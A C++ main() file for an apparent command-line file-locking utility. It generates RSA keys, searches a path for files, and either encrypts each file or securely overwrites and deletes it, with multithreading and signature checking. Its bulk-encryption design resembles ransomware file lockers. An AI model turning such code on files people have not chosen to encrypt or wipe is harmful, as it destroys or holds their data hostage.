#include "filesystem.h"
#include "CommandParser.h"
#include "global_parameters.h"
#include "threadpool.h"
#include "base64/base64.h"
#include "rsa/rsa.h"
#include "logs.h"


int main(int argc, char* argv[])
{
    logs::initLog(TRUE);
    parser::ParsingCommandLine(argc, argv);
    base64::init_table_base64_decode();

    BOOL success = FALSE;
    LIST<DRIVE_INFO>* DriveInfo = new LIST<DRIVE_INFO>;
    PDRIVE_INFO data = NULL;
    int f;
    CRYPT_INFO* CryptInfo = new CRYPT_INFO;

    if (GEN)
    {
        if (!(success = HandlerGenKeyPairRSA()))
            LOG_ERROR("[HandlerGenKeyPairRSA] Failed");
        goto exit;
    }


    if (!locker::GeneratePolicy(CryptInfo))
    {
        LOG_ERROR("Failed to Generate Policy.");
        goto exit;
    }

    f = pathsystem::StartLocalSearch(DriveInfo, GLOBAL_PATH.g_Path);
    if (f == 0) { LOG_ERROR("No files. null."); goto exit; }
    LOG_ENABLE("After this operation %d files will be changed", f);

    LIST_FOREACH(data, DriveInfo)
        LOG_INFO("Filename: " log_str, data->Filename);
    if (!global::print_command_g()) goto exit;

    if (f == 1 || THREAD_ENABLE)
    {
        if (O_REWRITE)
        {
            LIST_FOREACH(data, DriveInfo)
            {
                if (filesystem::RewriteSDelete(CryptInfo, data->FullPath))
                    LOG_SUCCESS("success overwrite file; " log_str, data->Filename);
                else
                    LOG_ERROR("failed overwrite file; " log_str, data->Filename);
            }
        }
        else
        {
            LIST_FOREACH(data, DriveInfo)
                locker::HandlerCrypt(CryptInfo, data);
        }
    }
    else
    {
        int maxThreads = std::thread::hardware_concurrency() - 1;
        int threads = maxThreads;
        if (f <= maxThreads)
            threads = f - 1;

        ThreadPool pool(threads);
        if (O_REWRITE)
        {
            LIST_FOREACH(data, DriveInfo)
            {
                pool.put_task([=]()
                    {
                        filesystem::RewriteSDelete(CryptInfo, data->FullPath);
                    });
            }
            pool.run_main_thread();
        }
        else
        {
            LIST_FOREACH(data, DriveInfo)
            {
                pool.put_task([=]()
                    {
                        locker::HandlerCrypt(CryptInfo, data);
                    });
            }
            pool.run_main_thread();
        }
    }

    if (signature && !filesystem::VerifySignatureRSA(CryptInfo->hash_data.HashList))
        LOG_ERROR("[VerifySignatureRSA] Failed");

    success = TRUE;
exit:
    locker::FreeCryptInfo(CryptInfo);
    pathsystem::FreeList(DriveInfo);
    global::free_global();
    if (success)
        LOG_SUCCESS("EXIT_SUCCESS");
    else
        LOG_ERROR("EXIT");
    logs::CloseLog();

    return EXIT_SUCCESS;
}